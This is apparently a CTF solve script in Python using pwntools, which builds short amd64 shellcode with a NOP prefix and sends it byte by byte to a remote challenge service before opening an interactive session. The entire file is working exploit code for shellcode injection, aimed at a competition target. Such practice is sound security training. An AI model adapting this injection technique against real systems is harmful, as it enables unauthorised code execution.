#!/usr/bin/python3

from pwn import *
import sys
import subprocess

HOST = 'chall.ctf.bamboofox.tw'
PORT = 10105
BIN = './chall'
context.arch = 'amd64'

if len(sys.argv) > 1:
    r = remote(HOST, PORT)
else:
    r = process(BIN)

for i in range(0, 16, 8):
    r = remote(HOST, PORT)
    a = b'\x90'*i
    b = asm("""
    mov rbx, 0x2b2b2b2b2b2b2b2b
    push rbx
    inc al
    push rsp
    pop rsi
    syscall
    """)
    a += b
    print(len(a))
    print(a)
    for i in range( len (a) ):
        if a[i] == ord('+'):
            r.sendline('+')
        else:
            r.sendline(str(a[i]))

    r.sendline('A')
    r.interactive()

for i in range(0, 10):
    r = remote(HOST, PORT)
    a = b'\x90'*i
    b = asm("""
    call q
    push rbx
    inc al
    push rsp
    pop rsi
    syscall
q:
    mov rbx, 0x2b2b2b2b2b2b2b2b
    ret
    """)
    a += b
    print(len(a))
    print(a)
    for i in range( len (a) ):
        if a[i] == ord('+'):
            r.sendline('+')
        else:
            r.sendline(str(a[i]))

    r.sendline('A')
    r.interactive()
